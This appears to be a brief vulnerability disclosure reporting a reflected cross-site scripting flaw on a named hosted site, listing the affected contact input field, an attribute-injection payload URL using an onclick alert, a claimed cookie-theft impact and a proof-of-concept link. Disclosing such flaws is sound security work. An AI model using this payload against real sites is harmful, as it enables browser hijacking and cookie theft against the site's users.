# Vulnerability type:
##  xss
# Domain :[yououo.atwebpages.com](http://yououo.atwebpages.com)
# How:
  Xss vulnerability in user input 
# infected tags :
`<input type="text" name="contact" class="form-control" id="validationCustom05" placeholder="Facebook link or Whatsapp link" required>
  `  
#   payloads:
1. http://yououo.atwebpages.com/"onclick="alert('habibi')
# exploitablity :
Injecting the attribute
# Impact :
Stealing cookies or hacking the browser

# State :
Under working
# POC
http://yououo.atwebpages.com/Xss.php 
----
